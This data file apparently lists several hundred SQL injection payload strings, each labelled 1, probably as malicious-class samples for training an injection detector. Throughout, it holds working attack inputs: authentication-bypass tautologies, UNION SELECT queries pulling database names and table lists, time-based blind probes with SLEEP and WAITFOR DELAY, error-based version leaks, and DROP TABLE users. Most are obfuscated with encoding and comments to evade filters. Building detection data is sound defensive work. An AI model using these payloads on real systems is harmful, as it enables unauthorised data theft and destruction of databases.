"'        uniON        SeLecT        1,2,3 /*!*/AND 1=1--", 1
"1)) %55NION S%45LECT 1,database%28),3 AND 'a%27='a%27--", 1
"1'/**/%41N%44/**/%73ubstring%28da%74abase(),/**/1,/**/1)/**/=/**/'s'/**//**/#/**/more_noise--", 1
"1'      OR      ascii(substring(database(),      1,      1))      >      100      --#j7m4h7ezkq0", 1
"' U%4e%49ON SELECT nu%6cl, n%75ll, null -- #c9v6l7770g", 1
"1'/**/oR/**/if(substRInG(databaSe(),/**/1,/**/1) = 'A',/**/SLEep(5),/**/0)/**//**//*!*/aNd/**/1 = 1--", 1
"' oR EXISTs(sELecT 1 fROm USErs)--", 1
"%u0027/*!12345*/AND%u0020%31=1%u0020%2d-%u0020#fve6d47ufp0n", 1
";%20DrOP%20TaBLE%20UsERs;%20 OR (1)--", 1
"1%29%29%20UNION%20SELECT%201%2Cdatabase%28%29%2C3----ct6v95patushn", 1
"1'        OR        IF(substring(database(),        1,        1)%20=%20'a',        SLEEP(5),        0)         OR 'b'='b'----wc1lkmhu46", 1
"' oR 1in (1)1 --", 1
"1))/**/UNION/**/SELECT/**/1,database(),3--#j7i4e", 1
"admin'O/*!12345*/R/*%0a*/'1'='1%0a", 1
"1%29%29%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F1%2Cdatabase%28%29%2C3 # more_noise--#n59606utrakvw4", 1
"1%U0027%u0020and%u0020SUBstrINg(DAtabAsE(),%U00201,%U00201)%U0020%3D%u0020%u0027s%U0027%u0020%20OR%20%27b%27%3D%27b%27--", 1
"'%09%09%09%09%09O/**/R%09%09%09%09%09'1'	=	'1", 1
"%2531%20AND%201%3D1", 1
"WAITFOR%09%09%09DELAY%09%09%09'0:0:5'--", 1
";%20D%52OP%20TABLE%20users;%20%20OR%20(1)--", 1
"'/*!*/     OR%20%271'  =%09'1", 1
"1%u0027/**/orIf(subSTRiNg(DaTaBaSe(),1,1)=%u0027A%u0027,sLEep(5),0)%0a--", 1
"1) UNION SELECT 1,database(),3 OR 'b'='b'----v6p03xg6fbbj1b9", 1
"' UNION SELECT null, null, null  AND 'a'='a'-- --wbjf56wq", 1
"1'					UNION					SELECT					table_name,					null,					null					FROM					information_schema.tables					--#dzkhev17", 1
"1'UNION/*%0a*/SELECTtable_name,%0anull,nullFROM", 1
"information_schema.tables--random_noise--#j9123kriz6cyi8", 1
"'%20UNI%4fN%20SELECT 1,2,3--", 1
"%27%2520%2520%2520%2520UNION%2520%2520%2520%2520SELECT%2520%2520%2520%25201%2C2%2C3--", 1
"1AND%201<=1%0d%0a", 1
"1%u0027%u0020OR%u0020IF(substring(database(),%u00201,%u00201)>=%u0027a%u0027,%u0020SLEEP(5),%u00200)%u0020----d0mu4n4on226w", 1
"WAITFOR			DELAY			'0:0:5'--", 1
"test' OR '1'>='1' /*#8m06e", 1
"%31	AND	1	= 1", 1
"%u0027%u0020&&%u0020(1%3D1)1%3Dconvert(in%74,@@ve%72s%69on)%2d-", 1
"1%27OR%0d%0aIF(substring(database(),%0d%0a1,1)%3D%27a%27,SLEEP(5),0)--%0a", 1
"'/**/UNION SELECT null, null, null --", 1
";   DROP   TABLE   users;   --", 1
"test%27%20OR%20%271%27LIKE%271%27%20--%20", 1
"1 && %31=1--82D807", 1
"1' UNION SELECT table_name, null, null FROM information_schema.tables  # more_noise--", 1
"%27%20OR%20EXISTS(SELECT%201%20FROM%20users)%20OR%20(1)----erld9s", 1
"1'/**/unIOn/**/SeLeCT/**/TABLe_NamE,/**/NULL,/**/nuLL/**/frOm/**/INfORmatIoN_SCHemA.taBlEs/**/--", 1
"test%27%20O/*!12345*/R%20%271%27%3D%271%27%20--%20", 1
"1  &&  %28%31%20=%201)1 =%201 OR (1)", 1
"WAITF%4fR D%45LAY '0:%30:5'--", 1
"'%20%20OR%20%201%09LIKE	1%20%20--%20%20", 1
"WA%49TFOR DELA%59 '0:0:5'-%2d", 1
"%27				or				eXIsTS(selEcT				1				from				usErS)--", 1
"'OR%0d%0a1=1--/*%0D%0A*/--tngiimtgc", 1
"1AND%0d%0a1%3D1/*%0d%0a*/", 1
"'AND%0d%0a1IN (1)convert(int,@@version)--", 1
"", 1
"'OR%0a1=1/*%0a*/--", 1
"1)UNiOn/*%0A*/SELeCT1,dataBAsE(),3--%0a", 1
"WAI%54F%4fR%20DELAY%20%270%3A0%3A5%27-%2d", 1
"TeST'		or		'1' =	'1'		 -- random_noise--", 1
"test'OR'1'='1'/*/*%0d%0a*/#%0d%0amore_noise/*%0a*/", 1
"test' OR '1%27%3d'1' /* OR (1)", 1
"WaItFor%u0020DeLAy%u0020%u00270:0:5%u0027--", 1
"'/*!*/UNION %53E%4cECT null, null, null%20 /*!*/AND 1=1--%20--k%63c72dyye41u3%30", 1
"ADmIN' oR '1'='1", 1
"admin%27%20OR%20%271%27%3D%271%09%09#%09%09more_noise", 1
"WaiTFoRdElAy/*%0d%0a*/'0:0:5'	Or	(1)--", 1
"", 1
";%20SEL%45C%54%20pg_sl%65ep(5);%20--", 1
"adM%69n%27%4fr", 1
"%%3271%27%3D%271", 1
"1%u0027%u0020A/*!*/ND%u0020substring(database(),%u00201,%u00201)%u0020LIKE%u0020%u0027s%u0027%u0020--", 1
"1' Or iF(SUBsTRiNg(dAtABaSE(), 1, 1)='a', SLeEP(5), 0) --", 1
"%27%20OR%20EXISTS(SELECT%201%20FROM%20users)%20#%20more_noise--", 1
"1%20&&%201%3D1", 1
"%27%20OR%20EXISTS(%53ELECT%201%20%46%52O%4d%20users)--", 1
"1/**/And%U00201=1", 1
"1'        UNION        SELECT        table_name,        null,        null        FROM        information_schema.tables                OR        'b'	=%09'b'--", 1
"1			AND			1%09=	1--66p01ei3aawvb03", 1
"'AND%0aextractvalue(1,concat(0x5c,version()))--/*%0a*/", 1
"%2527%2520O/*!*/R%25201%253D1%2520--%2520%23us4s1yn0fqj", 1
"%u0027%20%20OR%20%20%u00271%u0027	=%u0020%u0020%u00271", 1
"%27%2520%2520%2520%2520%2520AND%2520%2520%2520%2520%25201%2509%3D%2509convert%28int%2C%40%40version%29 OR 'b'='b'--", 1
"test'/**/OR/**/'1'<='1'/**/--/**/--ktz01t91xdeqm41", 1
"1/*!*/&&%201%3D1", 1
"%3%42%20DRo%50%20TabLe%20Us%65rs%3B%20--", 1
"test'					OR					'1'>  =%20'1'					--", 1
"' && %65xtra%63tvalue(1,co%6ecat(0x5c,versi%6fn(%29))--", 1
"'/**/UNION SE%4cECT 1%2c2,3 OR (1)%2d-", 1
"%27%20OR%201%3D1%%32%30 /*!*/AND%20%31=1--%20", 1
"'UNIONSELECTnull,null,null%0a--", 1
"1%27%20OR%20IF%28substring%28database%28%29%2C%201%2C%201%29%3D%27a%27%2C%20SLEEP%285%29%2C%200%29%20 AND 'a'='a'--", 1
"1)  UNION  SELECT  1,database(),3--#gxw012yzz6", 1
"%u%30027%%75002%30OR%u00%3201=1%u0020/**/AND/**/'a'='a'--%u0020", 1
";sElECT/*%0a*/Pg_slEeP(5);--%0a", 1
"' && extractvalue(1,concat(0x5c,version()))--", 1
"1' AND substring(database(), 1, 1) >= 's' --", 1
"%27%20%20%20%20%20%55NiON%20%20%20%20%20seLeCT%20%20%20%20%201,2,3--", 1
"admin%27%20XOR%20%271%27%3D%271%20/*!*/AND%201%3D1", 1
";%20DROP%20TABLE%20%75sers;%20-%2d", 1
"'OR%0a'1'='1", 1
"", 1
"' UNI%4fN SELECT%201,2,3---%2dl%367q7b9ak0f", 1
"1%u0027%u0020%u0020||%u0020%u0020ascii(substring(database(),%u0020%u00201,%u0020%u00201))%u0020%u0020>%u0020%u0020100%u0020%u0020--", 1
"1' oR ASCii(SubStRiNG(daTabAse(), 1, 1)) > 100 --", 1
";/**//**/DROP/**//**/TABLE/**//**/users;/**//**/--", 1
"%u0027/*!*/OR%u0020EXISTS(SELECT%u00201%u0020FROM%u0020users)%u0020OR%u0020%u0027b%u0027=%u0027b%u0027--#zfeecv", 1
"1' UNion %53eLect%20tAble_nAMe, NULl, n%75L%6C F%52om iNFO%72matiOn_SchEMa.Ta%62LE%73 --", 1
"1'ANDsubstring(database(),1,1)%0aLIKE's'AND'a'='a'--#g8oeh5u8otce", 1
"%u0027%u0020OR%u0020EXISTS(SELECT%u00201%u0020FROM%u0020users)--#0quxeuw", 1
";/*!*/DRoP taBLe uSerS;  OR (1)--", 1
"1' OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0)  -- random_noise--", 1
"'		OR		'1'	=  '1#pyouvo3w9jyun", 1
"'/**/OR/**/EXISTS(SELECT/**/1/**/FROM/**/users)/**/--/**/random_noise--", 1
"%27/*!*/AND %31LIKEconvert(int,@@ve%72%73ion)--", 1
"' AND 1<=1 -- --fynrd0", 1
"%27UnioNSelEctnuLL,nULl,%0D%0aNULL", 1
"--", 1
";/*!*/DROPTABLEusers;/*%0d%0a*/--", 1
"'/*!12345*/OR EXISTS(SELECT 1 FROM users) AND 'a'='a'----fo2cy2srv6", 1
"adMIn'    oR    '1'  =%09'1    anD    'a'  =%09'a'", 1
"1' OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0)  # more_noise--", 1
"%27%20AND%201LIKEconvert%28int%2C%40%40version%29--", 1
"test' OR '1'='1' -- --n54qc8ia9vtis", 1
"1))%u0020UNION%u0020SELECT%u00201,database(),3--#8klfnmxmpupr", 1
"'/**/OR/**/'1'='1/*!*//*!*/AND 1=1", 1
"WAItFor%20DelaY%20%270%3A0%3A5%27--", 1
"%u0027%u0020UNION%u0020SELECT%u0020null,%u0020null,%u0020null%u0020/**/OR/**/(1)--%u0020--kab2z", 1
"%u0027OR1=1 OR (1)--", 1
"/*%0a*/", 1
"; DROP TABLE users;  OR 'b'='b'--", 1
"1)/**/UN/**/ION/**/SELECT/**/1,database(),3--", 1
"1))%20UNION%20SELECT%201,database(),3--#o8g6k2cz8qopzw3", 1
"%27%2F%2A%21%2A%2FAND1%3D1--%250d%250a%2F%2A%250a%2A%2F", 1
"; sElEct PG_sleEP(5);  /*!*/AnD 1=1--", 1
"'/**/A/*!12345*/ND/**/1LIKE1/**/--/**/", 1
"%27%20Or/**/1=1/**/--/**/--j51bx1", 1
"1%u0027%4fR%49F(substring(database(),/*%0a*/1,1)IN%u0020(1)%u0027%61%u0027,SL%45EP(5),0%29/*%0a*/%2d-/*%0d%0a*/", 1
"%27/**/aND%201%3DCOnvert(InT,@@VersIoN)--", 1
"admin'/**/OR/**/'1'='1/**//*!*/AND/**/1=1--44b3aval", 1
"%27%20A/**/ND%20extractvalue(1,concat(0x5c,version()))--", 1
"' OR '1'%4cIKE%271", 1
"1%27%2F%2A%2A%2FOR%2F%2A%2A%2Fascii%28substring%28database%28%29%2C%2F%2A%2A%2F1%2C%2F%2A%2A%2F1%29%29%2F%2A%2A%2F%3E%2F%2A%2A%2F100%2F%2A%2A%2F--", 1
"1%27%20OR%20ascii%28substring%28database%28%29%2C%201%2C%201%29%29%20%3E%20100%20--#ex2tdm8zso2rbci", 1
"WAITFOR%20DELAY%20%270:0:5%27 AND 'a'='a'--", 1
"%27%20AND%201%3Dconver%74%28int%%32C%40%40v%65%72sion%29%20A%4e%44%20%27a%%327%3D%27a%27--", 1
"1' OR IF(substring(database(), 1, 1)IN (1)'a', SLEEP(5), 0) --", 1
"%u0027/**/OR%u00201>=1%u0020 # more_noise--%u0020", 1
"'/**//**//**//**//**/union/**//**//**//**//**/selecT/**//**//**//**//**/1,2,3--", 1
"1) unIoN seleCT 1,dAtabasE(),3--", 1
"' AND extractvalue(1,concat(0x5c,version()))--#ko8wgp4wzkg", 1
"WAITFOR%20DELAY%20%270:0:5%27----ov9o4t6xibc", 1
"1' OR ascii(substring(database(), 1, 1)) > 100  OR (1)--", 1
"test%%327/**/OR/**/%271%27%20%%33D%%320%20%27%31%27%2f**//*", 1
"adMiN%27/**/oR/**/%271%27%3d%271", 1
"waiTFoR%20DeLaY%20%270%3a0%3A5%27--", 1
"1%27%20%20%20%20%20%20AND%20%20%20%20%20%20substring%28database%28%29%2C%20%20%20%20%20%201%2C%20%20%20%20%20%201%29%20%20%20%20%20%20%2509%3D%2520%20%20%20%20%20%20%27s%27%20%20%20%20%20%20--", 1
"'AND%0aextra%63tvalue(1%2cconcat(%30x5c,ver%73io%6e()))--%0d%0a", 1
"%%327%2%30AND%201%3D1%2%30 OR %27b'LIKE'b'--%20", 1
"%27%2F%2A%2112345%2A%2FUNION%20SELECT%201%2C2%2C3 /*!*/AND 1=1--", 1
"1%u0027%u0020%u0020%u0020%u0020unioN%u0020%u0020%u0020%u0020selECT%u0020%u0020%u0020%u0020tABLE_nAMe,%u0020%u0020%u0020%u0020NULL,%u0020%u0020%u0020%u0020NUlL%u0020%u0020%u0020%u0020FroM%u0020%u0020%u0020%u0020InformATIOn_schEmA.TablES%u0020%u0020%u0020%u0020--", 1
"WAITFOR%20DELAY%20%270:0:5%27 AND 'a'='a'--#g58f1w3ens3ho", 1
"1%27%2F%2A%2A%2FOR%2F%2A%2A%2Fascii%28substring%28database%28%29%2C%2F%2A%2A%2F1%2C%2F%2A%2A%2F1%29%29%2F%2A%2A%2F%3E%2F%2A%2A%2F100%2F%2A%2A%2F----8i7i8c6w", 1
"'/**%2f%41ND/**/extra%63tva%6cue(1,concat(%30x5c,version()))-%2d", 1
"%2527%20AND%20extractvalue%28%2531%252cc%256fncat%280x5c%252cversion%28%29%29%29 # more_noise--", 1
"1/*!12345*/AND 1=1 OR 'b'='b'", 1
"'%20%20uNIOn%20%20sEleCt%20%201,2,3--", 1
";/*!12345%2a/%44roP tABle us%65rS;%20--", 1
"1%27%20OR%20IF(substring(database(),%201,%201)%3D%27a%27,%20SLEEP(5),%200)%20--#1k026dilzxq21x1", 1
"%2527%2520Or%%32%35201%%3253D1%2520--%%32520", 1
"1'					UN%49ON	%09			SELECT					table_name,					null%2c					null					FROM					inf%6frm%61ti%6fn_sche%6d%61.%74ables%09			%09--", 1
"%27%20anD%201%3D1%20%20%23%20mORE_nOISe--%20%23oHm4Tzci", 1
"1%25u%2530027%25u0020OR%25u0020ascii%28sub%2573trin%2567%28%2564a%2574abase%28%29%2C%25u00%253201%2C%25u00201%29%29%25u0%253020%3E%25u0020100%25u0%253020-%252d", 1
"1'/**/UNION SELECT table_name, null, null FROM information_schema.tables  -- random_noise--", 1
"test%27 OR '1%27='1' /*", 1
"WAITFORDELAY%0d%0a'0:0:5'--/*%0a*/--50i7jed", 1
"%u0027/**/AND/**%2f1=cO%6eVErT(int,@@V%65%72sio%6E)--", 1
"1))%20UNIONSEL%45CT", 1
"1,database(%29,3%2d-/*%0a*/ # more_noise#duimh", 1
"1' UnIOn sELeCT TaBle_NAME, NuLl, NUlL frOm INfoRmATIoN_scHemA.tableS  XOr 'B'='b'--", 1
"' OR 1=1 -- #ybb63auhcm5", 1
"%27/**//**//**//**/UNION/**//**//**//**/SELECT/**//**//**//**/null,/**//**//**//**/null,/**//**//**//**/null/**//**//**//**/--/**//**//**//**/", 1
"%27%20OR%20%271%27%3D%271#2c58i66k7a", 1
"1)%u0020%u0020UNION%u0020%u0020SELECT%u0020%u00201,database(),3----dgs98ansjev2h", 1
"1%20ANd%201%3D1", 1
"1))UNION/*%0d%0a*/SELECT", 1
"1,database(),3--/*%0d%0a*/", 1
"1AND1%3d1/*!*/AND", 1
"1=1--6oksvuzdi", 1
"%u0027%u0020OR%u00201>=1%u0020%u0020OR%u0020%u0027b%u0027=%u0027b%u0027--%u0020", 1
"'OR/*%0a*/", 1
"EXISTS(SELECT1FROMusers)--", 1
"WAITFORDELAY/*%0a*/'0:0:5'--%0a", 1
"1%u0027/**/O/*!*/R/**/ascii(substring(database(),/**/1,/**/1))/**/>/**/100/**/--", 1
"'%20%20OR%20%20EX%49STS%28SELECT%20%20%31%20%20FROM%20%20us%65rs)--", 1
"' o%52 ExiS%54s(sElECt 1 fROm%20usE%72S)--", 1
"1%29%29%2520UNI%254fN%2520SEL%2545CT%2520%2531%2Cdatab%2561se%28%29%2C3--", 1
"%27%20XOR%201%3D1%20--%20#89no3149zb44d", 1
";%20DROP%20TABLE%2%30%75sers;%20%20/*!%2a/%41ND%201%3D1-%2d", 1
"1' && substring(database(), 1, 1) = 's'  AND 'a'='a'--", 1
"%U0027%u0020UniON%U0020SElEcT%U00201,2,3----lqI1xQ", 1
"1%29%29%2520uNion%2520SELect%25201%2CDaTABasE%28%29%2C3--", 1
"1' OR IF(substring(database(), 1, 1)LIKE'a', SLEEP(5), 0)  OR (1)--", 1
"1))UNIONSELECT", 1
"1,database(),3----9dme8fdba", 1
"t%65st' XOR '1%27LIKE'1' -- -%2d8wnzuaq6%30qyu1", 1
";/*!12345*/SELECT pg_sleep(5); --", 1
"1)%09UNION%09SELECT%091,database(),3--", 1
"1%27%20unION%20sElect%20TabLe_NAME%2C%20NUll%2C%20NuLL%20FrOM%20inFORMATIoN_sChEMa.TAblES%20--", 1
"ADMIN%u0027/**/Or%u0020%u00271%u0027=%u00271", 1
";DROP%0aTABLEusers;--/*%0d%0a*/", 1
"' AN%44 extr%61ctv%61lu%65(1,concat(0x5c,version(%29))--", 1
"1%27%09AND%09substring(database(),%091,%091)%09%09%3D%20%20%09%27s%27%09--#w8kernsw1lkbpk", 1
"; SeLeCt Pg_slEEp(5); --", 1
"1'/**/OR/**/ascii(substring(database(),/**/1,/**/1))/**/>/**/100/**/----7gpsqa", 1
"1' && (1IN (1)1)substring(database(), 1, 1) = 's' --", 1
"%u00%327%u0%3020AND%u%300%3201  =	1%u0020--%u0020", 1
"'UNION%0d%0aS%45LE%43T", 1
"1,2%2c3 AND%20'a'='a'--/*%0%61*/", 1
"1'uNionSELECTtAble_NAMe,nULl,", 1
"nullFrom/*%0d%0a*/inFOrmAtiOn_sChEma.taBLES", 1
"--", 1
"1'%20%20%20%20%20AND%20%20%20%20%20substring(database(),%20%20%20%20%201,%20%20%20%20%201)%20%20%20%20%20  = %20%20%20%20%20's'%20%20%20%20%20--", 1
"1AND%0a1=1%0a", 1
"%31%u0027%u0020UNION%u002%30SELECT%u0020t%61%62%6ce_name,%%750020null,%u0%3020n%75ll%u0020FROM%u0020in%66ormation_s%63hema.tables%u002%30%u00%32%30/*!*/A%4eD%u00201%3D1--", 1
"'/**//**/AND/**//**/extractvalue(1,concat(0x5c,version()))--#hwypdc7ik9m", 1
"1'O/*!*/RIF(substring(database(),1,%0a1)='a',SLEEP(5),", 1
"0)--/*%0a*/", 1
"%31%2F%2A%2112345%2A%2FA%4eD%201%3%441", 1
"1%27%20OR%20IF%28SUbstRING%28daTaBaSE%28%29%2C%201%2C%201%29%3C%3D%27a%27%2C%20sleep%285%29%2C%200%29%20--", 1
";%20DRO%50 TABL%45 us%65rs; ----g1h0pg", 1
"1%u0027%u0020OR%u0020IF(substring(database(),%u00201,%u00201)=%u0027a%u0027,%u0020SLEEP(5),%u00200)%u0020--#peqllapr5fpb43w", 1
";SELECT%0apg_sleep(5);/*%0a*/--/*%0a*/", 1
"'O%52%45XISTS(SELECT%0d%0a1FR%4fMus%65rs)----2lucp1tgvlw", 1
"'%20or EXiSt%53(sElecT%201 FrOM uS%65rS%29 -- RaND%6FM_NoISE--", 1
"1%20AND%201IN%20%281%291", 1
"%u0027%u0020OR%u00201%3D1%u0020--%u0020", 1
"adm%69n%27%20O/*!12345*/R%20%27%31%27%3D%271 OR 'b'='b'", 1
"1%27%20UNION%20SE%254cECT%20table_name%2C%20null%2C%20nul%256c%20F%2552OM%20inf%256frmation%255f%2573c%2568ema.t%2561bles%20%20--%20random_noise--", 1
"%27OR%250a%271%27%3D%271%250a", 1
"1'/*!*/XOR substring(database(), 1, 1) = 's' --", 1
"' AND extractvalue(1,concat(0x5c,version())) -- random_noise--", 1
"%27%20OR%20%271%27%3D%271/*!*/AND%0a1=1/*%0d%0a*/--fs0rf28z", 1
"%u0027%u0020OR%u0020EXISTS(SELECT%u00201%u0020FROM%u0020users)%u0020--%u0020random_noise--", 1
"'/*!12345*/AND/**/1=convert(int,@@version)----fd1hqmxq5", 1
"test' XOR '1'='1' /*--znjqbh8b475tu9", 1
"%27%20O/*!*/R%20%271%27%3D%271%20%2F%2A%21%2A%2FAND%201%3D1#afszs45xy", 1
"1%20AND%201%3D1%20#%20more_noise", 1
"%27", 1
"AND", 1
"extractvalue(1,concat(0x5c,version()))--", 1
"waiTfOr  dELAy  '0:0:5'--", 1
"1/*!*/AND%201%3E%3D1", 1
"1)/**/UNION/**/SELECT/**/1,database(),3--#dkf5a", 1
"%27%20AND%20extractvalue(1,concat(0x5c,version()))----7ije6g3", 1
"'/**//**/AND/**//**/1<%09=	convert(int,@@version)--", 1
"WAITFORDELAY", 1
"'0:0:5'--/*%0d%0a*/", 1
"'OR1=1/*%0a*/--", 1
"%27%20Union%20SElecT%201,2,3 OR (1)--", 1
"' aND 1=1 --", 1
"%2527%2520OR%2520EXISTS%28SELECT%25201%2520FROM%2520users%29%2520--%2520random_noise--", 1
"test' OR '%31'IN (1)'1'%20/*", 1
"%61dmin%u0027%u0020%4fR%u0020%271%u0027IN (1)%u00271#46c%7akcl2g9n4b", 1
"1)%%750020UNION%u0%3020S%45LECT%u00201,database()%2c%33--", 1
"1))%20UNION SE%4cE%43T 1,%64atabase(),3--", 1
"1          AND          1 = 1          #          more_noise", 1
"1 and 1=1", 1
"1)%20%20%20UNION%20%20%20SELECT%20%20%201,database(),3--", 1
"'/**/AND/**/1=convert(int,@@version)----vujyqlh4", 1
"' AND extractvalue(1,concat(0x5c,version()))--#o3yarh3kx4qt", 1
"1'ORIF(substring(database(),1,1)='a',SLEEP(5),%0a0)--", 1
"TEsT%u0027%U0020or%U0020%u00271%U0027=%U00271%u0027%U0020--%u0020", 1
"1/**/AND/**/1%3D1", 1
"%27%u0020OR%u00201=1%u0020--%20", 1
"%u0027/*!12345*/OR%u00201<=1%u0020--%u0020", 1
"%27%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2Fnull%2C%2F%2A%2A%2Fnull%2C%2F%2A%2A%2Fnull%2F%2A%2A%2F--%2F%2A%2A%2F", 1
"%U0027/*!12345*/AND%u00201=CoNVERt(int,@@vERsION)--", 1
"%27%2F%2A%2A%2FaNd%201%3D1%20--%20%23dXVO70uCAf", 1
"' OR EXISTS(SELECT 1 FROM users) # more_noise--#qbraw7nif7", 1
"'/**/AnD/**/1 =  cOnVeRT(iNt,@@vERsIOn)--", 1
"1/**/AND/**/1%09=%091", 1
"%27 OR 1%3d1 -- --0if5dpfyxb", 1
"1) UnioN SelecT 1,DataBAse(),3----sdtYC7G", 1
"'or", 1
"'1'='1", 1
"1%u0027/**/AND/**/substring(database(),/**/1,/**/1)/**/ =%09/**/%u0027s%u0027/**/--", 1
"'Un%49oN/*%0d%0a*/sE%4cECTNUlL,nULl,Nul%6c-%2D--lohn0b7w", 1
"test%25u0027%2F%2A%2112345%2A%2FOR%25u0020%25u00271%25u0027%3D%25u00271%25u0027%25u0020 /*!*/AND 1=1--%25u0020", 1
"test%27%20OR%20%271%27%3D%271%27%20--%20#huw75", 1
"%3B%2509%2509%2509%2509dROp%2509%2509%2509%2509TablE%2509%2509%2509%2509USeRS%3B%2509%2509%2509%2509--", 1
"WAITFOR%u0020DELAY%u0020%u00270:0:5%u0027 /*!*/AND 1=1--#lqkib", 1
"1%29%20UN/*!12345*/ION%20SELECT%201%2Cdatabase%28%29%2C3--#wh8scqwbfq", 1
"%u0027%09%09%09%09O%52%09%09%09%09EX%49STS(SE%4cECT%09%09%09%091%09%09%09%09FROM%09%09%09%09us%65rs)--", 1
"'UNIONSELECTnull,null,null--/*%0a*/", 1
"%25u0027%2F%2A%2A%2FAND%25u0020extractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29--", 1
"waItFoR/*!*/DELAY%u0020%u00270:0:5%u0027--", 1
"'/**/A/*!12345*/ND/**/1<=1/**/--/**/", 1
"1%27%20and%20SUBSTRing(dATAbAse(),%201,%201)%20%3e%3d%20%27s%27%20--#0d4inzgu1te", 1
"%u0027%20oR%u0020%u00271%27=%u00271", 1
"1'ORIF(substring(database(),1,%0a1)IN (1)'a',SLEEP(5),0) AND 'a'='a'--", 1
"'/*!*/UNION SELECT 1,2,3--#kc77ztwzr0", 1
"1)/*!12345*/UNION%20SELECT%201,database(),3 AND 'a'='a'--", 1
"test%2527%2520OR%2520%25271%2527%253D%25271%2527%2520%2F%2A--vz1bebamo1f1n", 1
"1'ORascii(substring(database(),1,1))/*%0a*/>100#more_noise--", 1
"%2527%2520AND%25201%253dconve%2572t%28%2569nt%2C%40%40version%29--", 1
"' OR EXI%53TS(SELECT 1 %46%52OM users%29----lvg0m8jh9k7hiwk", 1
"1))UNION%0d%0aSELECT/*%0a*/1,database(),3 -- random_noise--", 1
"", 1
"1))/**/UNION/**/SELECT/**/1,database(),3 OR (1)--", 1
"test' OR '1'='1' /* OR (1)", 1
"1'/**/a/*!12345*/nD/**/SuBSTRinG(dataBase(),/**/1,/**/1)/**/=/**/'S'/**/--", 1
"1%27%20anD%20sUBstRIng%28dAtaBaSE%28%29%2C%201%2C%201%29%20%3D%20%27s%27%20----jcA6Bi5wjm", 1
"1)%20UNION%20SELECT%201,database(),3----txk2yg", 1
"'||(1=1)'1'='1/*!*/AND1=1/*%0d%0a*/", 1
"waITfOR DELAY '0:0:5'----f41BBLQc6fmOs", 1
"1%29%29%20UNION%20SELECT%201%2Cdatabase%28%29%2C3 -- random_noise--", 1
"1%u0027/**/OR/**/ascii(substring(database(),/**/1,/**/1))/**/>/**/100/**/--", 1
"admin%2527%2520OR%2520%25271%2527%253D%25271", 1
"%u0027%u0020AND%u0020extractvalue(1,concat(0x5c,version()))%u0020OR%u0020%u0027b%u0027%20%3D%20%u0027b%u0027--", 1
"' aND eXtrACTvAlUE(1,CoNcat(0X5c,VerSiON()))--", 1
"%u0027%u0020||%u0020(1%3D1)1%3d1%u0020-%2d%u0020", 1
"1)%20UNION%20SELECT%201,database(),3%20OR%20(1)--", 1
"%u002%37%u002%30AND%u%30020extractvalue(%31,co%6ecat(0x5c,version()))----xovl2%67z%79a%66qb74m", 1
"admin%u0027/**/OR/**/%u00271%u0027=%u00271", 1
"'UNION%0d%0aSELECT1,2,3--", 1
"1%u0027%u0020UNION%u0020SELECT%u0020table_name,%u0020null,%u0020null%u0020FROM%u0020information_schema.tables%u0020%u0020AND%u0020%u0027a%u0027%3D%u0027a%u0027--#b26ep7fjrq", 1
"%u0027%u002%30AND%u0020%31%3d1%u0020--%u0%3020", 1
"1%27%20A/*!12345*/ND%20substring(database(),%201,%201)%20%3D%20%27s%27%20--", 1
"test'OR'1'='1'/*%0a*//*%0a", 1
"'%20%20%20%20%20UNION%20%20%20%20%20SELECT%20%20%20%20%201,2,3%20%20%20%20%20OR%20%20%20%20%20'b' =%09'b'--", 1
"1%u0027%u0020%u0020OR%u0020%u0020IF(substring(database(),%u0020%u00201,%u0020%u00201)%09=%09%u0027a%u0027,%u0020%u0020SLEEP(5),%u0020%u00200)%u0020%u0020--#pvpwa22k91xli42", 1
"1/*!*/AND/**//**//**//**/1/**//**/=/**/1", 1
"admin%27%20%20%20OR%20%20%20%271%27%20%3D%2520%271", 1
"1'%20%20OR%20%20ascii(substring(database(),%20%201,%20%201))%20%20>%20%20100%20%20 -- random_noise--", 1
"1%u0027%u0020AnD%U0020subsTRing(DaTAbaSE(),%u00201,%u00201)%U0020=%u0020%u0027S%U0027%U0020--#DSqGuZ3Zc", 1
"1%27%20OR%20ascii(substring(database(),%201,%201))%20%3E%20100%20 AND 'a'='a'--", 1
"WAITFOR DELAY '0:0:5' -- random_noise--", 1
"%27AND%2F%2A%250a%2A%2F1%3D1--%250d%250a", 1
"admin%27/**/||/**%2f(1%3D1%29%271%27%3D%271", 1
"' AND 1LIKEconvert(int,@@version)--", 1
";%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020DROP%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020TABLE%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020users;%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020/*!12345*/AND 'a'='a'--", 1
"1    ANd    1%09=  1    #    MOrE_noIsE#057ge841UeGA", 1
"'UNION%20SE%4cECTnull,%20null%2cnull/*%0a*/OR'b'='b'--", 1
"1' OR ascii(substring(database(), 1, 1)) > 100  # more_noise--", 1
"1%27%2F%2A%2112345%2A%2FAND%20substring%28database%28%29%2C%201%2C%201%29%20%3D%20%27s%27%20--#b5ca9xhv", 1
"'Or%0a1=1--/*%0d%0a*/--9baqfpztjaj27r", 1
"%27ANDextractvalue(1,concat(0x5c,version()))--", 1
"", 1
"' A%4eD 1=%63on%76ert(int,@@version)%2d-", 1
"t%65St%27%20OR%20%271%27%3D%271%27%20--%20", 1
"'					and					1%20IN (1)  1					--					--nqnw0", 1
"'			AND			1	=%09convert(int,@@version)----ax0un3je", 1
"%u0027/*!*/anD%u0020%u0020%u0020%u00201%u0020=%u00201%u0020%u0020%u0020%u0020--%u0020%u0020%u0020%u0020", 1
"%31'%4fR%0d%0aIF(%73ubstring(da%74abase(),1,1)='%61',%2f%2a%0d%0a*/SLEEP(5),0)--", 1
"1%u0027%U0020UnIoN%U0020sELECT%u0020taBlE_NAme,%u0020NULL,%U0020NuLL%u0020frOm%U0020INFORMAtiON_SchEmA.tAbLeS%U0020----m5NSu5827f", 1
"test'OR'1'='1'--/*%0d%0a*/", 1
"1%u0027%u0020OR%u0020ascii(substring(database(),%u00201,%u00201))%u0020>%u0020100%u0020----yj7pwhgnwio0yq", 1
"1)/**/uNion/**/selECt/**/1,DaTAbasE(),3--", 1
